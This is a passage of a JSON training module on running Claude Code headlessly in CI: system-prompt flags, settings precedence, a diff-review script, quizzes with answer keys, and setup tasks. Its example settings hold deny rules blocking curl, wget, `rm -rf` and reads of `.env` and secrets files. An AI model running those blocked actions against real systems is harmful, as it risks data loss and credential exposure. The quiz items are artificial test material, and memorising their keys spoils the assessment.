\"$PR_NUMBER\" \\\n  | claude --bare -p \\\n    --append-system-prompt \"You are a security engineer. Flag OWASP Top 10 issues. Output findings as JSON array with keys: file, line, severity, description.\" \\\n    --output-format json \\\n    --allowedTools \"Read\"\n```\n\nAppending preserves default tool guidance and safety instructions. You supply only what differs.\n\n### Replace: when you own the whole identity\n\nUse `--system-prompt` or `--system-prompt-file` when the surface, identity, or permission model differs fundamentally from Claude Code's default — typically when building a non-coding agent in a pipeline that no human watches, or when embedding Claude Code inside another system with its own safety layer.\n\nWhen you replace the prompt, you are responsible for:\n- Tool usage guidance (when is Bash appropriate vs Edit?)\n- Safety rules (what should Claude refuse?)\n- Any constraints the task requires\n\n```bash\nclaude --bare -p \"$TASK\" \\\n  --system-prompt-file ./agents/summarizer-prompt.txt \\\n  --tools \"Read\" \\\n  --output-format json\n```\n\n### Prompt cache optimization with --exclude-dynamic-system-prompt-sections\n\nFor CI jobs where many users or parallel runners execute the same prompt, per-machine sections of the system prompt (working directory, environment info, memory paths, git-repo flag) prevent cache hits across machines. The `--exclude-dynamic-system-prompt-sections` flag moves those sections out of the system prompt and into the first user message instead, maximizing prompt cache reuse:\n\n```bash\nclaude -p --exclude-dynamic-system-prompt-sections \"$SHARED_PROMPT\"\n```\n\nThis flag only applies with the default system prompt. It is ignored when `--system-prompt` or `--system-prompt-file` is set.\n\n### Committed vs personal: where prompt customization lives\n\n| | `.claude/settings.json` (committed) | `.claude/settings.local.json` (gitignored) | `--flags` at call site |\n|---|---|---|---|\n| Shared team conventions | Yes | No | If short |\n| Personal style preferences | No | Yes | If session-only |\n| CI-specific instructions | Via `CLAUDE.md` or `--append-system-prompt-file` | No | Yes — flags only |\n| Per-task context | No | No | Yes — flags only |\n| Prompt cache optimization | `--exclude-dynamic-system-prompt-sections` with `-p` | — | — |\n\n### Common pitfall: conflating CLAUDE.md with system prompt\n\n`CLAUDE.md` files are loaded as memory and prepended as context, not as system prompt replacements. They always load (unless `--bare`). `--append-system-prompt` layering happens at the system prompt level. Both can be active simultaneously. The managed Code Review service reads `CLAUDE.md` for project context and `REVIEW.md` as its highest-priority instruction — these are yet another layer, separate from `--append-system-prompt`."
   },
   {
    "heading": "Configuration File Topology for CI and Teams",
    "body": "Getting the file structure wrong is the most common source of \"works on my machine\" CI failures. Understanding what loads where, at what precedence, prevents a developer's local MCP server from silently altering a CI job.\n\n### The precedence chain\n\n```\nManaged settings  (/etc/claude-code/ or C:\\Program Files\\ClaudeCode\\)  ← highest, cannot be overridden\n  ↓\nCLI arguments (--settings, --allowedTools, etc.)  ← session override\n  ↓\n.claude/settings.local.json  ← personal, gitignored\n  ↓\n.claude/settings.json  ← project, committed\n  ↓\n~/.claude/settings.json  ← user global  ← lowest for normal sessions\n```\n\nPermission rules are an exception: they merge across scopes rather than strictly override. A deny rule at any level cannot be overridden by an allow rule at a lower level.\n\n### Committed vs personal file decisions\n\n| Setting | `.claude/settings.json` (committed) | `.claude/settings.local.json` (gitignored) |\n|---|---|---|\n| `permissions.allow` for team-shared commands | Yes | No |\n| `permissions.deny` for security rules | Yes | No |\n| Personal model preference | No | Yes |\n| Developer's local MCP servers | No | Yes (or `~/.claude.json`) |\n| CI-only permission rules | No — use managed settings or CLI flags | — |\n| `DISABLE_AUTOUPDATER` for pinned CI versions | Via `env` key in `settings.json` | — |\n\n### MCP configuration files\n\n| File | Scope | Who controls it |\n|---|---|---|\n| `.mcp.json` (project root) | All team members in this project | Committed to repo |\n| `~/.claude.json` | Current user, all projects | Developer's machine |\n| `--mcp-config <file>` | Current invocation only | CI job |\n\nFor CI, prefer `--mcp-config` plus `--strict-mcp-config` over committing a `.mcp.json` with CI-specific servers that developers will also pick up inadvertently.\n\n### Minimal CI settings.json\n\nFor a project with shared permission rules and CI-safe defaults:\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run test *)\",\n      \"Bash(npm run lint *)\",\n      \"Bash(npm run build *)\",\n      \"Bash(git status *)\",\n      \"Bash(git diff *)\",\n      \"Bash(git log *)\"\n    ],\n    \"deny\": [\n      \"Bash(git push *)\",\n      \"Bash(rm -rf *)\",\n      \"Read(./.env)\",\n      \"Read(./.env.*)\",\n      \"Read(./secrets/**)\"\n    ]\n  },\n  \"env\": {\n    \"DISABLE_AUTOUPDATER\": \"1\"\n  }\n}\n```\n\n`DISABLE_AUTOUPDATER: \"1\"` in the `env` block prevents Claude Code from auto-updating mid-CI run, which can shift behavior across pipeline reruns.\n\n### Managed settings for enterprise enforcement\n\nFor organizations that need non-overridable controls, deploy to the platform-specific managed settings path:\n\n| OS | Path |\n|---|---|\n| macOS | `/Library/Application Support/ClaudeCode/managed-settings.json` |\n| Linux / WSL | `/etc/claude-code/managed-settings.json` |\n| Windows | `C:\\Program Files\\ClaudeCode\\managed-settings.json` |\n\nExample managed settings block:\n\n```json\n{\n  \"allowManagedPermissionRulesOnly\": true,\n  \"allowManagedMcpServersOnly\": true,\n  \"permissions\": {\n    \"deny\": [\"Bash(curl *)\", \"Bash(wget *)\"]\n  }\n}\n```\n\n`allowManagedPermissionRulesOnly` prevents project or user settings from adding allow rules that circumvent org policy. `allowManagedMcpServersOnly` means only the admin-defined MCP server allowlist applies, even if users add their own servers."
   },
   {
    "heading": "Putting It Together: A Complete CI Script Pattern",
    "body": "This section shows a real pattern: a CI job that lints a diff, runs tests, and fails if Claude finds blocking issues — with all the bounding, auth, tool scoping, and output parsing wired correctly.\n\n### Script: CI diff review with exit-code gating\n\n```bash\n#!/usr/bin/env bash\n# ci/claude-review.sh\n# Usage: ANTHROPIC_API_KEY=sk-ant-... ci/claude-review.sh\nset -euo pipefail\n\nPR_DIFF=$(gh pr diff \"${PR_NUMBER}\" 2>/dev/null || git diff origin/main...HEAD)\n\nRESPONSE=$(echo \"$PR_DIFF\" | claude \\\n  --bare \\\n  -p \\\n  --output-format json \\\n  --max-turns 5 \\\n  --max-budget-usd 1.00 \\\n  --tools \"Read\" \\\n  --allowedTools \"Read\" \\\n  --append-system-prompt \\\n    \"You are a security and correctness reviewer. Examine the diff. Output JSON: {\\\"blocking\\\": bool, \\\"findings\\\": [{\\\"file\\\": str, \\\"line\\\": int, \\\"severity\\\": str, \\\"description\\\": str}]}. blocking=true if any finding is severity=critical.\" \\\n  --json-schema \\\n    '{\"type\":\"object\",\"required\":[\"blocking\",\"findings\"],\"properties\":{\"blocking\":{\"type\":\"boolean\"},\"findings\":{\"type\":\"array\",\"items\":{\"type\":\"object\",\"required\":[\"file\",\"line\",\"severity\",\"description\"],\"properties\":{\"file\":{\"type\":\"string\"},\"line\":{\"type\":\"integer\"},\"severity\":{\"type\":\"string\"},\"description\":{\"type\":\"string\"}}}}}}' \\\n  \"Review this diff for security vulnerabilities and logic errors\")\n\nCOST=$(echo \"$RESPONSE\" | jq -r '.total_cost_usd')\nBLOCKING=$(echo \"$RESPONSE\" | jq -r '.structured_output.blocking')\nFINDINGS=$(echo \"$RESPONSE\" | jq -r '.structured_output.findings')\n\necho \"Cost: \\$${COST}\"\necho \"Findings: $FINDINGS\"\n\nif [ \"$BLOCKING\" = \"true\" ]; then\n  echo \"BLOCKING findings detected. Failing CI.\"\n  exit 1\nfi\n```\n\n### What each flag does here\n\n| Flag | Reason |\n|---|---|\n| `--bare` | No CLAUDE.md, no hooks, no ambient MCP — same result on every machine |\n| `--output-format json` | Get structured response with cost metadata |\n| `--max-turns 5` | Five turns is sufficient for diff review; prevents runaway |\n| `--max-budget-usd 1.00` | Hard cost cap per review |\n| `--tools \"Read\"` | Model only sees Read in context — cannot call Bash or Edit |\n| `--allowedTools \"Read\"` | Pre-approve Read so it executes without a permission prompt |\n| `--append-system-prompt` | Preserve default safety layer, add task-specific instructions |\n| `--json-schema` | Enforce output shape at decode time; result lands in `.structured_output` |\n\n### GitHub Actions wrapper\n\n```yaml\nname: Claude Security Review\non:\n  pull_request:\n    types: [opened, synchronize]\n\njobs:\n  security-review:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      contents: read\n      pull-requests: write\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0  # need full history for git diff\n      - name: Install claude\n        run: npm install -g @anthropic-ai/claude-code\n      - name: Run security review\n        env:\n          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n          PR_NUMBER: ${{ github.event.pull_request.number }}\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: ci/claude-review.sh\n```\n\n### Common pitfalls in CI scripts\n\n**Not setting --bare.** A developer adds a hook to their `~/.claude/settings.json` that runs on every Bash call. That hook fires in CI and slows or breaks the job. Always `--bare` unless you explicitly need repository-local customization.\n\n**Missing --allowedTools in -p mode.** Without pre-approved tools, any tool call that needs permission confirmation aborts in non-interactive mode. Enumerate every tool the task legitimately needs.\n\n**Using CLAUDE_CODE_OAUTH_TOKEN with --bare.** Bare mode skips OAuth and keychain reads entirely. Use `ANTHROPIC_API_KEY` for bare-mode CI invocations.\n\n**Not setting DISABLE_AUTOUPDATER.** Claude Code may auto-update between pipeline runs, silently changing behavior. Pin it via the `env` key in `.claude/settings.json`.\n\n**Connecting global MCP servers.** Project `.mcp.json` servers load in non-bare mode. A Sentry or Jira MCP server that is convenient locally will also try to connect (and authenticate) in CI, wasting startup time and potentially failing. Use `--strict-mcp-config` to isolate, or use `--bare` to skip all MCP discovery.\n\n**Relying on managed Code Review for blocking.** The managed Code Review service never blocks a merge on its own. If you need a gate, read its check run output via the GitHub API in your own CI step and fail based on the severity counts."
   }
  ],
  "preQuiz": [
   {
    "prompt": "You want to run Claude Code in a GitHub Actions workflow using your team's Anthropic Console API billing (not a subscription). Which command do you use inside the CI step to authenticate?",
    "options": [
     "claude setup-token",
     "claude auth login --console",
     "claude auth status --json",
     "claude auth login --sso"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "`claude auth login --console` signs in with Anthropic Console credentials, routing billing through API usage rather than a subscription. `setup-token` mints a long-lived OAuth token for subscription billing, not Console API billing."
   },
   {
    "prompt": "Your CI pipeline runs `claude -p 'audit this diff'` but it keeps hitting runaway cost on large PRs. Which two flags together cap both the number of agentic turns AND the dollar spend?",
    "options": [
     "--max-turns N and --max-budget-usd N",
     "--safe-mode and --bare",
     "--permission-mode plan and --output-format json",
     "--no-session-persistence and --effort low"
    ],
    "correct": 0,
    "sectionIndices": [
     0
    ],
    "explanation": "`--max-turns` caps the number of agentic turns (errors when reached), and `--max-budget-usd` caps dollar spend before stopping. The other options affect permissions or startup behavior, not cost/loop control."
   },
   {
    "prompt": "You pass `--allowedTools 'Bash(git log *)'` to your headless claude invocation. A team member assumes this means Claude cannot call any other Bash commands. What actually happens?",
    "options": [
     "Claude can only run `git log` commands; all other Bash calls are blocked",
     "`--allowedTools` auto-approves matching tools without prompting but does NOT restrict which tools are available — other Bash patterns can still be called",
     "Claude errors out if it tries any Bash command not in the allowed list",
     "The flag is only valid in interactive mode, so it is silently ignored in headless mode"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "`--allowedTools` auto-approves matching calls without a permission prompt but does NOT restrict availability. To remove a tool from context entirely, use `--disallowedTools` with a bare tool name."
   },
   {
    "prompt": "You want to pin your team's CI invocations to a fixed set of MCP servers and prevent any user-level MCP config from leaking in. Which combination of flags achieves this?",
    "options": [
     "--disallowedTools 'mcp__*' and --mcp-config team.json",
     "--mcp-config team.json and --strict-mcp-config",
     "--bare and --mcp-config team.json",
     "--tools '' and --mcp-config team.json"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "`--mcp-config team.json` loads the specified servers, and `--strict-mcp-config` ignores all other (user-level) MCP configuration, ensuring only the pinned set is active."
   },
   {
    "prompt": "Your CI script passes `--system-prompt-file pipeline-rules.txt` to Claude. A colleague warns this could be dangerous. What is the specific risk?",
    "options": [
     "The flag only works in interactive mode, so it is silently ignored in CI",
     "`--system-prompt-file` performs a full replacement of the default system prompt, dropping ALL default tool guidance and safety instructions — you own safety entirely",
     "It conflicts with `--append-system-prompt` and causes Claude to error",
     "The flag adds the file contents on top of the default prompt, potentially doubling token usage"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "`--system-prompt` / `--system-prompt-file` fully replace the default system prompt, removing all built-in tool guidance and safety instructions. Use `--append-system-prompt` instead if you want to add rules while keeping the defaults."
   },
   {
    "prompt": "Your organization uses `--exclude-dynamic-system-prompt-sections` with `-p` for shared scripted workloads. What specific problem does this flag solve?",
    "options": [
     "It prevents the model from reading CLAUDE.md files in subdirectories",
     "It moves per-machine sections (cwd, env, memory paths, git-repo flag) into the first user message so the system prompt is identical across machines, enabling prompt-cache reuse",
     "It strips tool descriptions from the system prompt to reduce token count",
     "It disables all dynamic tool approvals, equivalent to --permission-mode plan"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "Per-machine sections like cwd and memory paths vary across runners, busting the prompt cache. Moving them to the first user message keeps the system prompt byte-identical across machines, preserving cache hits."
   },
   {
    "prompt": "The managed Code Review service posts a PR comment but the `Claude Code Review` check run shows 'neutral'. Your branch protection rule requires the check to pass before merging. What happens?",
    "options": [
     "The PR is blocked — a neutral check counts as a failure under branch protection",
     "Code Review never approves or blocks — the check always completes neutral and cannot gate merges via branch protection; you must parse the machine-readable check output yourself",
     "The PR auto-merges because neutral means no Important findings were found",
     "Branch protection ignores neutral checks, so the PR merges freely regardless of findings"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "The `Claude Code Review` check always completes neutral by design. It cannot gate merges via branch protection. To build a gate, you must parse the machine-readable last line of the check run output (the `bughunter-severity` JSON) and fail the CI step yourself."
   },
   {
    "prompt": "You configure a high-traffic repo to use 'After every push' review mode. A PR author opens a draft PR and pushes 15 commits while iterating. How does the managed Code Review service handle this?",
    "options": [
     "All 15 pushes trigger separate reviews, costing roughly $225–$375 total",
     "Automatic triggers do not run on draft PRs, so no reviews fire; only `@claude review` in a top-level comment would trigger one",
     "Only the first push triggers a review; subsequent pushes are queued and skipped",
     "Reviews run on draft PRs only for the 'After every push' mode, not for 'Manual' mode"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Automatic triggers (including 'After every push') do not run on draft PRs. Manual triggers (`@claude review`) do run on drafts. This is the mechanism to avoid burning budget on in-progress work."
   },
   {
    "prompt": "A developer posts `@claude review` as an inline comment on a specific diff line in a PR. Will this trigger a Code Review?",
    "options": [
     "Yes — inline comments on diff lines are the intended way to trigger targeted reviews",
     "No — manual triggers must be top-level PR comments with the command at the start of the comment; inline diff comments are not recognized",
     "Yes, but only if the developer has write access to the repository",
     "No — `@claude review` only works in the PR description, not in comments"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Manual triggers must be top-level PR comments (not inline on a diff line) with the command at the start of the comment. Inline diff comments are not recognized as trigger commands."
   },
   {
    "prompt": "You want Code Review to stop flagging auto-generated migration files and to report at most three nits per review. Where do you put these rules, and why?",
    "options": [
     "In CLAUDE.md at the repo root, because it is read as the highest-priority system prompt override",
     "In a repo-root REVIEW.md, because it is injected verbatim into every review agent's system prompt as highest-priority instructions and lands more reliably than rules buried in CLAUDE.md",
     "In a `.github/claude-review.yml` config file that the GitHub App reads before each review",
     "In the PR description using a `<!-- claude-config -->` HTML comment block"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "REVIEW.md at the repo root is injected verbatim into every review agent's system prompt as highest-priority instructions. CLAUDE.md is also read as project context, but REVIEW.md is the right place for review-behavior changes and lands more reliably."
   },
   {
    "prompt": "Your organization's Anthropic bill shows Code Review charges even though you process all other Claude usage through Bedrock. Why?",
    "options": [
     "Bedrock does not support Code Review, so the service automatically falls back to direct Anthropic billing",
     "Code Review is billed via usage credits separately and appears on the Anthropic bill even if the org uses Bedrock or Vertex for other Claude usage",
     "This is a billing error — Code Review should route through whichever provider the org uses",
     "The GitHub App always bills the PR author's personal Anthropic account, not the org account"
    ],
    "correct": 1,
    "sectionIndices": [
     1
    ],
    "explanation": "Managed Code Review billing is separate from included plan usage and appears on the Anthropic bill regardless of whether the org routes other Claude traffic through Bedrock or Vertex."
   },
   {
    "prompt": "A team sets `--enable-auto-mode` in their CI script after upgrading to Claude Code v2.1.120. What happens?",
    "options": [
     "The flag enables automatic permission acceptance for all tool calls",
     "`--enable-auto-mode` was removed in v2.1.111; the correct flag is `--permission-mode auto`",
     "The flag is silently ignored and Claude defaults to `--permission-mode default`",
     "Claude starts in auto mode but logs a deprecation warning and continues normally"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "`--enable-auto-mode` was removed in v2.1.111. The replacement is `--permission-mode auto`. Scripts using the old flag will break on v2.1.111+."
   },
   {
    "prompt": "You need to troubleshoot a CI failure where Claude is behaving unexpectedly. You suspect a hook or MCP server is the cause. Which flag lets you isolate user/project customizations while keeping auth, model, built-in tools, and permissions intact?",
    "options": [
     "--bare",
     "--safe-mode",
     "--permission-mode default",
     "--disallowedTools 'mcp__*'"
    ],
    "correct": 1,
    "sectionIndices": [
     0
    ],
    "explanation": "`--safe-mode` (v2.1.169+) disables all user/project customizations (hooks, skills, MCP, CLAUDE.md) while keeping auth, model, built-in tools, and permissions normal. `--bare` skips discovery of hooks/skills/plugins/MCP but does not have the same isolation guarantee for all customization sources."
   }
  ],
  "tasks": [
   {
    "id": "stage-7-task-ci-auth",
    "afterSectionIdx": 0,
    "title": "Set up non-interactive auth for CI",
    "instructions": "**Option A — Subscription billing (setup-token)**\n\n```bash\n# Run this on your local machine (interactive, requires a Claude subscription)\nclaude setup-token\n# Copy the printed token — it is never saved automatically\n\n# In your CI environment (GitHub Actions, GitLab, etc.) add the secret:\n# Secret name: CLAUDE_CODE_OAUTH_TOKEN\n# Value: <the token printed above>\n\n# In your workflow YAML:\nenv:\n  CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}\n```\n\n**Option B — Console API billing (auth login --console)**\n\n```bash\n# In CI, run:\nclaude auth login --console\n# Follow the printed URL to complete auth in the browser,\n# or use --email to pre-fill the Console account email.\n\n# Verify auth succeeded (exit 0 = logged in):\nclaude auth status\necho \"Exit code: $?\"\n```\n\n**Smoke test your CI setup:**\n\n```bash\nclaude -p 'Print the number 42 and nothing else' \\\n  --max-turns 1 \\\n  --output-format text\n# Expected output: 42\n```",
    "doneWhen": "Running `claude -p 'Print the number 42 and nothing else' --max-turns 1 --output-format text` in a non-interactive shell (or CI environment) exits 0 and prints `42`."
   },
   {
    "id": "stage-7-task-headless-flags",
    "afterSectionIdx": 0,
    "title": "Run a bounded headless audit with scoped tool permissions",
    "instructions": "Run a real headless invocation with cost controls, tool scoping, and machine-readable output.\n\n```bash\n# Create a small test file to audit\necho 'function add(a, b) { return a + b; }' > /tmp/test-audit.js\n\n# Run the audit with cost/loop caps, auto-approve only git reads, deny all MCP\nclaude -p 'List any issues you see in the file /tmp/test-audit.js. Be concise.' \\\n  --max-turns 3 \\\n  --max-budget-usd 0.10 \\\n  --output-format json \\\n  --allowedTools 'Read' \\\n  --disallowedTools 'mcp__*' \\\n  --no-session-persistence\n```\n\nInspect the JSON output structure:\n\n```bash\nclaude -p 'Print JSON: {\"status\": \"ok\"}' \\\n  --max-turns 1 \\\n  --output-format json \\\n  --no-session-persistence | python3 -m json.tool\n```\n\nThen verify that `--allowedTools` does NOT prevent other tools from being available by checking what tools Claude acknowledges it has:\n\n```bash\nclaude -p 'List the tool names available to you.' \\\n  --max-turns 1 \\\n  --output-format text \\\n  --no-session-persistence\n# You should see more than just Read — --allowedTools only skips prompts, it does not restrict\n```",
    "doneWhen": "The bounded invocation exits without error, returns JSON output, and you can observe that `--allowedTools Read` alone does not eliminate other tools from Claude's available set."
   },
   {
    "id": "stage-7-task-review-md",
    "afterSectionIdx": 1,
    "title": "Author a REVIEW.md to control managed Code Review behavior",
    "instructions": "If your repo has the managed Code Review GitHub App enabled, create a `REVIEW.md` at the repo root to control review behavior. If you do not have the app, you can still create and commit the file so it is ready.\n\n```bash\n# Navigate to your repo root\ncd ~/projects/YOUR_REPO  # replace with your actual repo path\n\n# Create REVIEW.md with focused, actionable rules\ncat > REVIEW.md << 'EOF'\n## Review guidelines\n\n### What counts as Important (red)\nOnly flag issues that would cause a production failure, data loss, or a security\nvulnerability. Style, readability, and performance micro-optimizations are not\nImportant.\n\n### Nit volume cap\nReport at most five nits per review. If there are more, mention the count only.\n\n### Skip these paths entirely\n- `**/generated/**` — machine-generated code\n- `**/*.lock` — lockfiles\n- `**/migrations/**` — database migrations\n- Files where the diff is only whitespace or comment changes\n\n### Verification bar\nEvery behavior claim in a finding must cite a specific file and line number.\nDo not infer behavior from naming conventions alone.\n\n### Re-review convergence\nAfter the first review on a PR, suppress new nit-level findings and post\nImportant findings only.\nEOF\n\n# Commit it\ngit add REVIEW.md\ngit commit -m 'Add REVIEW.md to control Claude Code Review behavior'\n```\n\nOptionally test the local `/code-review` command (no GitHub App required):\n\n```bash\n# In any Claude Code session with an active diff:\n# /code-review effort=low\n```",
    "doneWhen": "`REVIEW.md` exists at the repo root, is committed to git, and contains at least: a narrowed definition of Important findings, a nit cap, and a list of paths to skip."
   }
  ],
  "visualizations": [
   {
    "id": "stage-7-v",
    "kind": "comparison-table",
    "title": "Automation, CI & integrations",
    "textualSummary": "Key concepts of Automation, CI & integrations: headless (print) mode, CI authentication, cost and loop bounding.",
    "columns": [
     "Concept",
     "In this stage"
    ],
    "rows": [
     {
      "label": "headless (print) mode",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "CI authentication",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "cost and loop bounding",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     },
     {
      "label": "tool and MCP scoping",
      "cells": {
       "Concept": {
        "value": "yes"
       },
       "In this stage": {
        "value": "yes"
       }
      }
     }
    ]
   }
  ],
  "confusions": [
   {
    "misconception": "Skipping Automation, CI & integrations.",
    "correction": "Each stage is load-bearing for the setup."
   },
   {
    "misconception": "These concepts are interchangeable.",
    "correction": "Each has a distinct role; see the definitions."
   }
  ],
  "quiz": [
   {
    "id": "stage-7-q1",
    "type": "multiple-choice",
    "prompt": "Your team's CI pipeline runs `claude -p` to auto-triage issues. After a few weeks, costs spike because a runaway agent opened hundreds of tool calls on a single job. Which two flags should you add to the invocation to bound this in the future?",
    "options": [
     "`--max-turns N` and `--max-budget-usd N`",
     "`--bare` and `--safe-mode`",
     "`--no-session-persistence` and `--output-format json`",
     "`--permission-mode plan` and `--allow-dangerously-skip-permissions`"
    ],
    "correct": 0,
    "explanation": "The content explicitly recommends `--max-turns` + `--max-budget-usd` together to bound runaway cost and loops in pipelines. `--bare`/`--safe-mode` affect customization loading, not cost caps. `--no-session-persistence` and `--output-format json` are useful but don't cap spend or turns. `--permission-mode plan` slows execution but doesn't cap it."
   },
   {
    "id": "stage-7-q2",
    "type": "multiple-choice",
    "prompt": "A teammate sets `--allowedTools 'Bash(git log *)'` in a CI script, expecting it to prevent Claude from running any other Bash commands. On the next run, Claude still executes `Bash(rm -rf temp/)` without prompting. What is the correct explanation?",
    "options": [
     "`--allowedTools` auto-approves matching tools without prompting but does NOT restrict which tools are available — other tools remain usable.",
     "`--allowedTools` is not supported in `-p` print mode; it is silently ignored.",
     "The glob pattern `git log *` does not match subcommands correctly; you need `Bash(git *)` for it to take effect at all.",
     "Bash is a built-in tool that cannot be scoped by either `--allowedTools` or `--disallowedTools`."
    ],
    "correct": 0,
    "explanation": "`--allowedTools` only controls whether Claude prompts for approval — it does not remove or deny tools. To prevent `rm -rf`, use `--disallowedTools 'Bash(rm *)'` (scoped rule: leaves Bash available but denies matching calls). The flag works in print mode. Pattern syntax is valid. Bash is fully scopeable."
   },
   {
    "id": "stage-7-q3",
    "type": "multiple-choice",
    "prompt": "You want to grant your CI runner a Claude token for headless use, billed to the team's subscription (not the API). Which command produces a suitable long-lived token that CI can consume?",
    "options": [
     "`claude setup-token`",
     "`claude auth login --console`",
     "`claude auth login --sso`",
     "`claude auth status --json`"
    ],
    "correct": 0,
    "explanation": "`claude setup-token` mints a long-lived OAuth token for CI, billed to subscription. `claude auth login --console` authenticates for API-usage billing (not subscription billing). `--sso` forces SSO during an interactive login — it doesn't produce a CI token. `claude auth status` only checks current auth state; it produces no token."
   },
   {
    "id": "stage-7-q4",
    "type": "multiple-choice",
    "prompt": "A senior engineer argues: 'We should set the Code Review check as a required status check so PRs can't merge if Claude finds Important issues.' What is wrong with this plan?",
    "options": [
     "Code Review never approves or blocks — the check always completes neutral, so it cannot gate merges via branch protection.",
     "The Code Review check is only available on Manual trigger mode; automatic modes don't create a status check at all.",
     "Required status checks only work with GitHub Actions, not with a GitHub App like the Code Review service.",
     "Code Review results are delivered as PR comments, not as a check run, so there is nothing to gate on."
    ],
    "correct": 0,
    "explanation": "The check always completes neutral regardless of findings, so branch protection on it never blocks a merge. The content instructs teams to build their own gate by parsing the machine-readable severity line. The check exists in all trigger modes. It is a proper check run (not only comments). GitHub App checks work with branch protection."
   },
   {
    "id": "stage-7-q5",
    "type": "multiple-choice",
    "prompt": "Your team has a busy monorepo where multiple small PRs are pushed throughout the day. The Code Review service is currently set to 'After every push'. A teammate suggests switching to 'Manual' mode for this repo. What is the strongest operational justification?",
    "options": [
     "Manual mode is recommended for high-traffic repos so only specific ready PRs opt in, avoiding per-push cost accrual on every PR.",
     "Manual mode is the only trigger that runs on draft PRs, which the team relies on for early feedback.",
     "After every push auto-resolves threads when issues are fixed, but Manual mode preserves the original comments for audit trail.",
     "Manual mode avoids the 20-minute average review delay, since it runs inline with the push event."
    ],
    "correct": 0,
    "explanation": "The content explicitly recommends Manual for high-traffic repos to avoid per-push cost on all PRs. Draft PRs are the opposite: Manual triggers run on drafts but automatic triggers do not — so Manual mode supports drafts, but that's not the operational justification for switching a busy repo away from per-push. Auto-resolve happens in 'After every push' mode, not Manual. Manual mode doesn't change the review latency (it's queue-based)."
   },
   {
    "id": "stage-7-q6",
    "type": "multiple-choice",
    "prompt": "You need to prevent the Code Review agent from flagging lint errors and import ordering in a new repo because CI already enforces those. Where should you put these suppression instructions, and why?",
    "options": [
     "In `REVIEW.md` at the repo root, because it is injected verbatim as highest-priority instructions into every review agent's system prompt.",
     "In `CLAUDE.md` at the repo root, because Code Review reads that file first and it takes precedence over any other configuration.",
     "As a comment in a `@claude review` trigger comment, because inline instructions override all file-based configuration.",
     "In the org admin settings at `claude.ai/admin-settings/claude-code`, because review behavior is a team-wide policy."
    ],
    "correct": 0,
    "explanation": "REVIEW.md is injected as highest-priority system prompt content and is explicitly recommended for skip rules on CI-enforced items. CLAUDE.md is read as project context but is lower priority than REVIEW.md and the content warns rules 'buried in a long CLAUDE.md' land less reliably. Inline trigger comments are not documented as a configuration mechanism for persistent skip rules. Admin settings control billing and the GitHub App install, not per-repo review focus."
   },
   {
    "id": "stage-7-q7",
    "type": "multi-select",
    "prompt": "A teammate is setting up a shared CI script that will run `claude -p` across hundreds of parallel jobs from different team members' machines. They want to ensure prompt-cache reuse across jobs to minimize latency and cost. Select ALL flags or practices that are necessary or directly relevant to achieving cross-machine prompt-cache reuse.",
    "options": [
     "Pass `--exclude-dynamic-system-prompt-sections` alongside `-p`",
     "Use the same model across all jobs via `--model`",
     "Use `--bare` to skip CLAUDE.md and plugin/hook discovery",
     "Move per-machine sections (cwd, env, memory paths, git-repo flag) into the first user message",
     "Set `CLAUDE_CODE_SKIP_PROMPT_HISTORY` to disable session persistence"
    ],
    "correct": [
     0,
     3
    ],
    "explanation": "`--exclude-dynamic-system-prompt-sections` is the flag and the mechanism it enables (moving per-machine sections into the first user message) together constitute the stated approach. Using the same model is good practice but not documented as necessary for prompt-cache reuse in this context. `--bare` skips CLAUDE.md/hooks but doesn't address cache variance from per-machine system prompt content. Disabling session persistence prevents cross-session state leakage but is unrelated to prompt-cache reuse across parallel jobs."
   },
   {
    "id": "stage-7-q8",
    "type": "multi-select",
    "prompt": "You need to lock a CI job so that it uses ONLY the team's curated MCP servers and no servers from any individual developer's user-level MCP config. Select ALL flags required to achieve this.",
    "options": [
     "`--mcp-config <team-config-file>`",
     "`--strict-mcp-config`",
     "`--disallowedTools 'mcp__*'`",
     "`--tools ''`",
     "`--bare`"
    ],
    "correct": [
     0,
     1
    ],
    "explanation": "`--mcp-config` supplies the team's curated server list, and `--strict-mcp-config` causes only those servers to load, ignoring all other (user-level) MCP config. Together they pin the MCP surface. `--disallowedTools 'mcp__*'` would deny all MCP tool calls but still loads them into context (and denies the team's own servers too). `--tools ''` only affects built-in tools and does not affect MCP tools. `--bare` skips plugin/hook/MCP discovery from CLAUDE.md but the content does not document it as preventing user-level MCP config from loading."
   },
   {
    "id": "stage-7-q9",
    "type": "multiple-choice",
    "prompt": "A team's Code Review costs jumped from ~$20 per PR to ~$100 when they enabled 'After every push' on an active PR with frequent small fixup commits. A developer then posts `@claude review once` on that PR. What does this command do?",
    "options": [
     "Triggers a single one-shot review of the PR without subscribing it to future push-triggered reviews.",
     "Triggers a review and changes the repo's global trigger mode from 'After every push' to 'Manual' for all future PRs.",
     "Triggers a review and subscribes this PR to all future push reviews, identical to `@claude review`.",
     "Triggers a review and then immediately unsubscribes the PR from the 'After every push' mode permanently."
    ],
    "correct": 0,
